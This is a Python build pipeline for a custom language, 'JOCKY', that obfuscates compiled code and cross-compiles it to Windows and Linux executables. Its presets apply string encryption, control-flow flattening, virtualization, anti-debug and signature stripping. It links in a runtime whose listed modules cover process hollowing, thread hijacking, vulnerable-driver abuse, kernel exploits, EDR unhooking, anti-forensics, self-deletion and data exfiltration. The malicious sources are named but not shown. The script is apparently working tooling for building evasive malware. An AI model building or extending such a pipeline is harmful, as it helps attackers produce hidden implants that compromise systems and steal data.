#!/usr/bin/env python3
"""JOCKY Full Compilation Pipeline - Standalone Script

Runs each compilation stage sequentially with detailed logging:
  1. Parse    - Lex, parse, resolve modules, type check
  2. CodeGen  - Generate LLVM IR
  3. MLIR     - Convert to MLIR and run obfuscation passes
  4. LLVM Obf - Run LLVM IR obfuscation passes
  5. Compile  - Cross-compile to Windows COFF object
  6. Link     - Link into Windows PE executable
"""
import sys
import os
import time
import argparse
import subprocess
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = SCRIPT_DIR.parent
TOOLCHAIN = Path(os.environ.get("TOOLCHAIN_PATH", str(PROJECT_ROOT / "toolchain")))
SRC_DIR = PROJECT_ROOT / "src"
RUNTIME_DIR = SRC_DIR / "runtime"

sys.path.insert(0, str(SRC_DIR))

# Obfuscation presets
PRESETS = {
    "none": {
        "llvm": [],
        "mlir": [],
    },
    "light": {
        "llvm": ["strip-signature", "substitution"],
        "mlir": ["string-encrypt"],
    },
    "standard": {
        "llvm": ["strip-signature", "boguscf", "flattening", "substitution", "split", "indirect-call"],
        "mlir": ["string-encrypt", "constant-obfuscate", "symbol-obfuscate"],
    },
    "aggressive": {
        "llvm": ["strip-signature", "boguscf", "flattening", "substitution", "split", "indirect-call"],
        "mlir": ["string-encrypt", "constant-obfuscate", "symbol-obfuscate"],
    },
}


def log(stage, msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [{stage}] {msg}", flush=True)


def run(cmd, label, cwd=None, env=None):
    log("exec", f"{label}: {' '.join(str(c) for c in cmd)}")
    if env is None:
        env = os.environ.copy()
    result = subprocess.run(cmd, capture_output=True, text=True, cwd=cwd, env=env)
    if result.stdout.strip():
        for line in result.stdout.strip().split("\n"):
            log("exec", f"  stdout: {line}")
    if result.stderr.strip():
        for line in result.stderr.strip().split("\n"):
            log("exec", f"  stderr: {line}")
    if result.returncode != 0:
        log("FAIL", f"{label} exited with code {result.returncode}")
        sys.exit(1)
    return result


def stage_parse(source_file, build_dir):
    log("PARSE", f"Input: {source_file}")
    from jocky.language.lexer import Lexer
    from jocky.language.parser import Parser
    from jocky.language.checker import TypeChecker
    from jocky.language.resolver import ModuleResolver

    prelude_path = SRC_DIR / "jocky" / "stdlib" / "prelude.jky"
    prelude = prelude_path.read_text() if prelude_path.exists() else ""
    src = Path(source_file).read_text()
    full_src = prelude + "\n" + src
    log("PARSE", f"Source: {len(src)} bytes + {len(prelude)} bytes prelude")

    lexer = Lexer(full_src)
    tokens = lexer.tokenize()
    log("PARSE", f"Lexed {len(tokens)} tokens")

    parser = Parser(tokens)
    ast = parser.parse()
    log("PARSE", f"Parsed {len(ast.decls)} declarations")

    resolver = ModuleResolver(Path(source_file).parent)
    ast = resolver.resolve_program(ast)
    log("PARSE", f"After module resolution: {len(ast.decls)} declarations")

    checker = TypeChecker()
    checker.check(ast)
    log("PARSE", "Type check passed")

    return ast


def stage_codegen(ast, build_dir):
    log("CODEGEN", "Generating LLVM IR")
    from jocky.language.codegen import CodeGen

    cg = CodeGen()
    ir = cg.gen(ast)
    ir_path = build_dir / "output.ll"
    ir_path.write_text(ir)

    lines = ir.strip().split("\n")
    funcs = [l for l in lines if l.startswith("define ")]
    decls = [l for l in lines if l.startswith("declare ")]
    globals_ = [l for l in lines if l.startswith("@")]
    log("CODEGEN", f"Generated {len(lines)} lines of LLVM IR ({len(ir)} bytes)")
    log("CODEGEN", f"  Functions: {len(funcs)}, Declarations: {len(decls)}, Globals: {len(globals_)}")

    for f in funcs:
        name = f.split("@")[1].split("(")[0] if "@" in f else "?"
        log("CODEGEN", f"  fn: {name}")

    return ir_path


def stage_mlir_obfuscate(ir_path, build_dir, custom_passes=None):
    log("MLIR", "Converting LLVM IR to MLIR")
    mlir_path = build_dir / "output.mlir"
    mlir_obf_path = build_dir / "output_obf.mlir"

    run([str(TOOLCHAIN / "bin" / "mlir-translate"), "--import-llvm", str(ir_path), "-o", str(mlir_path)],
        "LLVM IR -> MLIR")
    log("MLIR", f"MLIR: {mlir_path.stat().st_size} bytes, {len(mlir_path.read_text().splitlines())} lines")

    plugin = TOOLCHAIN / "lib" / "MLIRObfuscationPlugin.so"

    if custom_passes:
        passes = [p.strip() for p in custom_passes.split(",") if p.strip()]
        if not passes:
            passes = []
    else:
        passes = []

    if passes:
        log("MLIR", f"Running MLIR obfuscation passes ({len(passes)} total): {', '.join(p.lstrip('-') for p in passes)}")
        mlir_opt = TOOLCHAIN / "bin" / "run-mlir-opt.sh"
        if not mlir_opt.exists():
            mlir_opt = TOOLCHAIN / "bin" / "mlir-opt"
        pass_args = [f"-{p.lstrip('-')}" for p in passes]
        run([str(mlir_opt), f"--load-pass-plugin={plugin}", str(mlir_path), "-o", str(mlir_obf_path)] + pass_args,
            "MLIR obfuscation")
    else:
        log("MLIR", "No MLIR obfuscation passes enabled (skipping MLIR obfuscation, copying input to output)")
        import shutil
        shutil.copy2(mlir_path, mlir_obf_path)
    log("MLIR", f"Obfuscated MLIR: {mlir_obf_path.stat().st_size} bytes, {len(mlir_obf_path.read_text().splitlines())} lines")

    log("MLIR", "Converting obfuscated MLIR back to LLVM IR")
    obf_ll = build_dir / "output_mlir_obf.ll"
    run([str(TOOLCHAIN / "bin" / "mlir-translate"), "--mlir-to-llvmir", str(mlir_obf_path), "-o", str(obf_ll)],
        "MLIR -> LLVM IR")
    log("MLIR", f"MLIR-obfuscated LLVM IR: {obf_ll.stat().st_size} bytes")

    obf_bc = build_dir / "output_mlir_obf.bc"
    opt = TOOLCHAIN / "bin" / "run-opt.sh"
    if not opt.exists():
        opt = TOOLCHAIN / "bin" / "opt"
    run([str(opt), str(obf_ll), "-o", str(obf_bc)], "Convert to bitcode")

    return obf_bc


def stage_llvm_obfuscate(bc_path, build_dir, custom_passes=None):
    log("LLVM-OBF", "Running LLVM IR obfuscation passes")
    plugin = TOOLCHAIN / "lib" / "LLVMObfuscationPlugin.so"
    obf_bc = build_dir / "output_full_obf.bc"

    opt = TOOLCHAIN / "bin" / "run-opt.sh"
    if not opt.exists():
        opt = TOOLCHAIN / "bin" / "opt"

    if custom_passes:
        passes = custom_passes
        if passes:
            log("LLVM-OBF", f"Using custom passes: {passes}")
            run([str(opt), f"-load-pass-plugin={plugin}", f"-passes={passes}", str(bc_path), "-o", str(obf_bc)],
                "LLVM obfuscation")
        else:
            log("LLVM-OBF", "No LLVM obfuscation passes enabled (skipping LLVM obfuscation)")
            import shutil
            shutil.copy2(bc_path, obf_bc)
    else:
        function_passes = ["opaque-pred", "substitution", "boguscf", "flattening", "linear-mba"]
        # Note: pdata-strip not available in toolchain, using core OLLVM passes
        passes = f"strip-signature,virtualize,function({','.join(function_passes)}),anti-debug,indirect-call"
        log("LLVM-OBF", f"Passes ({len(function_passes) + 4} total - CORE OLLVM SUITE): {passes}")
        log("LLVM-OBF", f"  Recommended order: strip metadata, virtualize, function rewrites, anti-debug, indirect-call last")
        run([str(opt), f"-load-pass-plugin={plugin}", f"-passes={passes}", str(bc_path), "-o", str(obf_bc)],
            "LLVM obfuscation")

    orig_size = bc_path.stat().st_size
    obf_size = obf_bc.stat().st_size
    log("LLVM-OBF", f"Bitcode: {orig_size} -> {obf_size} bytes ({obf_size/orig_size:.1f}x)")

    return obf_bc


def stage_compile(bc_path, build_dir, platform="windows"):
    clang = TOOLCHAIN / "bin" / "clang"

    if platform == "linux":
        log("COMPILE", "Cross-compiling to Linux x86_64 ELF object")
        obj_path = build_dir / "output.o"
        run([str(clang), "--target=x86_64-linux-gnu", "-O2", "-c", str(bc_path), "-o", str(obj_path)],
            "Bitcode -> Linux object")
    else:
        log("COMPILE", "Cross-compiling to Windows x86_64 COFF object")
        obj_path = build_dir / "output.obj"
        run([str(clang), "--target=x86_64-pc-windows-gnu", "-O2", "-c", str(bc_path), "-o", str(obj_path)],
            "Bitcode -> Windows object")

    log("COMPILE", f"Object file: {obj_path.stat().st_size} bytes")
    return obj_path


def stage_compile_runtime(build_dir, platform="windows"):
    log("RUNTIME", f"Compiling JOCKY runtime for {platform.upper()}")
    include_dir = RUNTIME_DIR / "include"
    objs = []

    # Linux now uses real runtime implementations instead of FFI shims
    # All 113 functions implemented across Phases 1-4

    if platform == "linux":
        compiler = "gcc"
        cflags = ["-O2", "-c", "-D_GNU_SOURCE", "-fPIC",
                  "-I", str(include_dir),
                  "-I", str(RUNTIME_DIR),
                  "-I", str(RUNTIME_DIR / "linux")]

        LINUX = RUNTIME_DIR / "linux"
        sources = [
            # Core runtime files (Phase 1-4 implementations)
            LINUX / "io" / "io_core.c",                      # File I/O + output
            LINUX / "core" / "runtime_init.c",               # Crypto + OpenSSL init
            LINUX / "core" / "sandbox_ops.c",                # Namespace isolation
            LINUX / "core" / "audit_ops.c",                  # Audit logging + threat scoring
            LINUX / "core" / "remaining_stubs.c",            # Phase 3-4 implementations
            LINUX / "anti_analysis" / "detection.c",         # Debugger/sandbox/VM detection
            LINUX / "process" / "ptrace_control.c",          # PTRACE operations
            LINUX / "process" / "thread_hijack.c",           # Thread code injection
            LINUX / "process" / "process_hollow.c",          # Process replacement
            LINUX / "kernel" / "kread_kwrite.c",             # Kernel memory access
            LINUX / "kernel" / "byovd_ops.c",                # BYOVD driver operations
            LINUX / "kernel" / "module_ops.c",               # Module resolution + syscall table
            LINUX / "exploitation" / "fence2pwn.c",          # FENCE2PWN exploit chain
            LINUX / "exfil" / "exfil_channels.c",            # Data exfiltration
            LINUX / "core" / "link_stubs.c",                  # Link stubs for undefined references

            # Legacy syscall files (if they exist and don't conflict)
            RUNTIME_DIR / "util" / "mem.c",
            RUNTIME_DIR / "compression" / "compression.c",
            RUNTIME_DIR / "crypto" / "crypto.c",
            RUNTIME_DIR / "core" / "plugin.c",
            LINUX / "syscalls" / "syscall.c",
            LINUX / "syscalls" / "file_syscall.c",
            LINUX / "syscalls" / "util_syscall.c",
            LINUX / "syscalls" / "env_syscall.c",
            LINUX / "syscalls" / "dir_syscall.c",
            LINUX / "syscalls" / "signal_syscall.c",
            LINUX / "syscalls" / "ipc_syscall.c",
            LINUX / "syscalls" / "sysinfo_syscall.c",
        ]

        for src in sources:
            if not src.exists():
                log("RUNTIME", f"  skip (not found): {src.name}")
                continue
            obj = build_dir / f"rt_{src.parent.name}_{src.stem}.o"
            try:
                run([compiler] + cflags + ["-I", str(src.parent), str(src), "-o", str(obj)],
                    f"Compile {src.name}")
                objs.append(obj)
                log("RUNTIME", f"  compiled: {src.name} -> {obj.stat().st_size} bytes")
            except SystemExit:
                log("RUNTIME", f"  warning: failed to compile {src.name}, continuing")

        return objs

    log("RUNTIME", "Compiling JOCKY runtime for Windows")
    # Try system MinGW first (more reliable), then bundled MinGW, fallback to clang
    mingw_gcc = None

    # Try system MinGW (more reliable cross-compiler setup)
    try:
        subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], capture_output=True, check=True)
        mingw_gcc = "x86_64-w64-mingw32-gcc"
        log("RUNTIME", "Using system MinGW")
    except (FileNotFoundError, subprocess.CalledProcessError):
        # Fallback to bundled MinGW if system not available
        bundled_mingw = TOOLCHAIN / "mingw" / "bin" / "x86_64-w64-mingw32-gcc"
        if bundled_mingw.exists():
            log("RUNTIME", "System MinGW not found, using bundled MinGW")
            mingw_gcc = str(bundled_mingw)
        else:
            log("RUNTIME", "MinGW not found, using clang for Windows PE target")
            mingw_gcc = "clang"

    if mingw_gcc == "clang":
        cflags = ["-O2", "-c", "--target=x86_64-pc-windows-gnu", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
                  "-I", str(include_dir),
                  "-I", str(RUNTIME_DIR),
                  "-I", str(RUNTIME_DIR / "windows")]
    else:
        cflags = ["-O2", "-c", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
                  "-I", str(include_dir),
                  "-I", str(RUNTIME_DIR),
                  "-I", str(RUNTIME_DIR / "windows")]

    WIN = RUNTIME_DIR / "windows"
    sources_win = [
        # Windows utilities (cross-platform implementations)
        WIN / "windows_utils.c",
        # Windows-specific implementations
        RUNTIME_DIR / "init" / "anti_analysis.c",
        RUNTIME_DIR / "util" / "mem.c",
        RUNTIME_DIR / "exfil" / "exfil.c",
        RUNTIME_DIR / "ai" / "mutation_engine.c",
        RUNTIME_DIR / "core" / "plugin.c",
        RUNTIME_DIR / "core" / "sandbox.c",
        WIN / "evasion" / "unhook.c",
        WIN / "evasion" / "syscalls.c",
        WIN / "evasion" / "stack_spoof.c",
        WIN / "evasion" / "blindside.c",
        WIN / "evasion" / "edrhoker.c",
        WIN / "execution" / "hollow.c",
        WIN / "execution" / "byovd.c",
        WIN / "execution" / "inmem.c",
        WIN / "execution" / "driver_interact.c",
        WIN / "exploitation" / "kernel_exploit.c",
        WIN / "byovd" / "btr_abuse.c",
        WIN / "byovd" / "byovd_modular.c",
        WIN / "registry" / "registry.c",
        WIN / "audit" / "audit.c",
        WIN / "anti_forensics" / "forensics.c",
        WIN / "anti_forensics" / "logs.c",
        WIN / "anti_forensics" / "self_delete.c",
        WIN / "security" / "token_manipulation.c",
        WIN / "exfil" / "enhanced_exfiltration.c",
    ]

    cflags_win = [
        "-O2", "-c", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
        "-I", str(include_dir),
        "-I", str(RUNTIME_DIR),
        "-I", str(RUNTIME_DIR / "windows"),
    ]

    # Set up environment for bundled MinGW only if using it
    compile_env = os.environ.copy()
    extra_flags = []
    use_bundled = mingw_gcc.startswith(str(TOOLCHAIN / "mingw"))

    if use_bundled:
        bundled_mingw_bin = TOOLCHAIN / "mingw" / "bin"
        bundled_mingw_lib = TOOLCHAIN / "mingw" / "lib"
        # Prioritize bundled toolchain bin directory in PATH
        if "PATH" in compile_env:
            compile_env["PATH"] = str(bundled_mingw_bin) + ":" + compile_env["PATH"]
        else:
            compile_env["PATH"] = str(bundled_mingw_bin)
        # Add bundled MinGW lib to library search paths
        ld_path = str(bundled_mingw_lib)
        if "LD_LIBRARY_PATH" in compile_env:
            compile_env["LD_LIBRARY_PATH"] = ld_path + ":" + compile_env["LD_LIBRARY_PATH"]
        else:
            compile_env["LD_LIBRARY_PATH"] = ld_path
        # Tell gcc where to find cc1 and other internal tools (use 10-win32 version)
        mingw_include = str(TOOLCHAIN / "mingw" / "x86_64-w64-mingw32" / "include")
        mingw_lib = str(TOOLCHAIN / "mingw" / "x86_64-w64-mingw32" / "lib")
        extra_flags = [
            "-B", str(TOOLCHAIN / "mingw" / "lib" / "10-win32") + "/",
            "-I", mingw_include,
            "-L", mingw_lib,
        ]

    for src in sources_win:
        if not src.exists():
            log("RUNTIME", f"  skip (not found): {src.name}")
            continue
        obj = build_dir / f"rt_{src.parent.name}_{src.stem}.o"
        try:
            run([mingw_gcc] + extra_flags + cflags_win + [
                 "-I", str(src.parent),
                 str(src), "-o", str(obj)],
                f"Compile {src.name}",
                env=compile_env)
            objs.append(obj)
            log("RUNTIME", f"  compiled: {src.name} -> {obj.stat().st_size} bytes")
        except SystemExit:
            log("RUNTIME", f"  warning: failed to compile {src.name}, continuing")

    log("RUNTIME", f"Total runtime objects: {len(objs)}")
    return objs


def stage_link(obj_path, runtime_objs, build_dir, output_name, platform="windows"):
    exe_path = build_dir / output_name

    if platform == "linux":
        log("LINK", "Linking Linux ELF executable")
        gcc = "gcc"

        all_objs = [str(obj_path)] + [str(o) for o in runtime_objs]
        cmd = [
            gcc,
            "-o", str(exe_path),
            *all_objs,
            "-lc",              # Standard C library
            "-ldl",             # Dynamic linker library (dlopen/dlsym)
            "-lpthread",        # POSIX threads
            "-lm",              # Math library
            "-lz",              # zlib (compression)
            "-lssl", "-lcrypto", # OpenSSL (crypto operations)
            "-lcurl",           # libcurl (HTTP/data exfiltration)
            "-no-pie",          # Disable PIE (position-independent executable)
        ]
        run(cmd, "Link ELF executable")
        log("LINK", f"Output: {exe_path} ({exe_path.stat().st_size} bytes)")

        result = subprocess.run(["file", str(exe_path)], capture_output=True, text=True)
        log("LINK", f"File type: {result.stdout.strip()}")

        return exe_path

    log("LINK", "Linking Windows PE executable")
    # Try system MinGW first (more reliable), then bundled, fallback to clang
    link_env = os.environ.copy()
    use_bundled = False

    try:
        subprocess.run(["x86_64-w64-mingw32-gcc", "--version"], capture_output=True, check=True)
        linker = "x86_64-w64-mingw32-gcc"
        log("LINK", "Using system MinGW")
    except (FileNotFoundError, subprocess.CalledProcessError):
        bundled_mingw = TOOLCHAIN / "mingw" / "bin" / "x86_64-w64-mingw32-gcc"
        if bundled_mingw.exists():
            linker = str(bundled_mingw)
            use_bundled = True
            log("LINK", "System MinGW not found, using bundled MinGW")
        else:
            linker = "clang"
            log("LINK", "Using clang for Windows PE target")

    # Set up environment for bundled MinGW
    linker_flags = []
    if use_bundled:
        bundled_mingw_bin = TOOLCHAIN / "mingw" / "bin"
        bundled_mingw_lib = TOOLCHAIN / "mingw" / "lib"
        if bundled_mingw_lib.exists():
            # Prioritize bundled toolchain bin directory in PATH
            if "PATH" in link_env:
                link_env["PATH"] = str(bundled_mingw_bin) + ":" + link_env["PATH"]
            else:
                link_env["PATH"] = str(bundled_mingw_bin)
            ld_path = str(bundled_mingw_lib)
            if "LD_LIBRARY_PATH" in link_env:
                link_env["LD_LIBRARY_PATH"] = ld_path + ":" + link_env["LD_LIBRARY_PATH"]
            else:
                link_env["LD_LIBRARY_PATH"] = ld_path
            # Explicitly set LD to use bundled linker
            link_env["LD"] = str(bundled_mingw_bin / "x86_64-w64-mingw32-ld")
            # Tell gcc where to find cc1 and other internal tools, plus include/lib paths
            mingw_lib = str(TOOLCHAIN / "mingw" / "x86_64-w64-mingw32" / "lib")
            linker_flags = [
                "-B", str(TOOLCHAIN / "mingw" / "lib" / "10-win32") + "/",
                "-L", mingw_lib,
                "-fno-use-linker-plugin",
                f"-fuse-ld={str(bundled_mingw_bin / 'x86_64-w64-mingw32-ld')}"
            ]

    all_objs = [str(obj_path)] + [str(o) for o in runtime_objs]
    if linker == "clang":
        cmd = [
            linker,
            "--target=x86_64-pc-windows-gnu",
            *all_objs,
            "-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi",
            "-ladvapi32", "-lkernel32", "-lws2_32",
            "-o", str(exe_path),
        ]
    else:
        cmd = [
            linker,
            *linker_flags,
            *all_objs,
            "-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi",
            "-ladvapi32", "-lkernel32", "-lws2_32",
            "-o", str(exe_path),
        ]
    run(cmd, "Link PE executable", env=link_env)
    log("LINK", f"Output: {exe_path} ({exe_path.stat().st_size} bytes)")

    result = subprocess.run(["file", str(exe_path)], capture_output=True, text=True)
    log("LINK", f"File type: {result.stdout.strip()}")

    return exe_path


def main():
    parser = argparse.ArgumentParser(description="JOCKY Compilation Pipeline")
    parser.add_argument("source", help="Source file (*.jky)")
    parser.add_argument("output_dir", nargs="?", default="/workspace/build", help="Output directory (default: /workspace/build)")
    parser.add_argument("--platform", choices=["windows", "linux"], default="windows", help="Target platform (default: windows)")
    parser.add_argument("--preset", choices=["none", "light", "standard", "aggressive"], default="standard", help="Obfuscation preset (default: standard)")
    parser.add_argument("--mlir-passes", type=str, default="", help="Custom MLIR passes (comma-separated flags, overrides preset)")
    parser.add_argument("--llvm-passes", type=str, default="", help="Custom LLVM passes (comma-separated, overrides preset)")

    args = parser.parse_args()

    source_file = args.source
    build_dir = Path(args.output_dir)
    build_dir.mkdir(parents=True, exist_ok=True)

    log("PIPELINE", "=" * 60)
    log("PIPELINE", "JOCKY Compilation Pipeline")
    log("PIPELINE", f"Source: {source_file}")
    log("PIPELINE", f"Build dir: {build_dir}")
    log("PIPELINE", f"Toolchain: {TOOLCHAIN}")
    log("PIPELINE", f"Target: {args.platform.title()} x86_64")
    log("PIPELINE", f"Preset: {args.preset}")
    log("PIPELINE", "=" * 60)

    start = time.time()

    log("PIPELINE", "Stage 1/6: Parse")
    ast = stage_parse(source_file, build_dir)

    log("PIPELINE", "Stage 2/6: CodeGen")
    ir_path = stage_codegen(ast, build_dir)

    log("PIPELINE", "Stage 3/6: MLIR Obfuscation")
    # Use custom MLIR passes if provided, otherwise use preset
    mlir_passes_arg = None
    if args.mlir_passes:
        mlir_passes_arg = args.mlir_passes
    else:
        preset = PRESETS.get(args.preset, PRESETS["standard"])
        mlir_passes_arg = ",".join(preset["mlir"])
        if mlir_passes_arg:
            log("PIPELINE", f"Using MLIR passes from '{args.preset}' preset: {mlir_passes_arg}")
    mlir_bc = stage_mlir_obfuscate(ir_path, build_dir, mlir_passes_arg if mlir_passes_arg else None)

    log("PIPELINE", "Stage 4/6: LLVM Obfuscation")
    # Use custom LLVM passes if provided, otherwise use preset
    llvm_passes_arg = None
    if args.llvm_passes:
        llvm_passes_arg = args.llvm_passes
    else:
        preset = PRESETS.get(args.preset, PRESETS["standard"])
        # Convert preset LLVM list to the format expected by stage_llvm_obfuscate
        llvm_list = preset["llvm"]
        if llvm_list:
            # Separate function passes from module passes
            function_passes = [p for p in llvm_list if p not in ("strip-signature", "indirect-call")]
            module_passes = [p for p in llvm_list if p in ("strip-signature", "indirect-call")]
            parts = []
            if function_passes:
                parts.append(f"function({','.join(function_passes)})")
            if module_passes:
                parts.append(",".join(module_passes))
            llvm_passes_arg = ",".join(parts) if parts else ""
            if llvm_passes_arg:
                log("PIPELINE", f"Using LLVM passes from '{args.preset}' preset: {llvm_passes_arg}")
    obf_bc = stage_llvm_obfuscate(mlir_bc, build_dir, llvm_passes_arg if llvm_passes_arg else None)

    log("PIPELINE", "Stage 5/6: Cross-Compile")
    obj_path = stage_compile(obf_bc, build_dir, args.platform)

    log("PIPELINE", "Stage 5b/6: Compile Runtime")
    runtime_objs = stage_compile_runtime(build_dir, args.platform)

    log("PIPELINE", "Stage 6/6: Link")
    stem = Path(source_file).stem
    output_ext = ".exe" if args.platform == "windows" else ""
    exe_path = stage_link(obj_path, runtime_objs, build_dir, f"{stem}{output_ext}", args.platform)

    elapsed = time.time() - start
    log("PIPELINE", "=" * 60)
    log("PIPELINE", f"BUILD COMPLETE in {elapsed:.1f}s")
    log("PIPELINE", f"Output: {exe_path}")
    log("PIPELINE", "=" * 60)


if __name__ == "__main__":
    main()
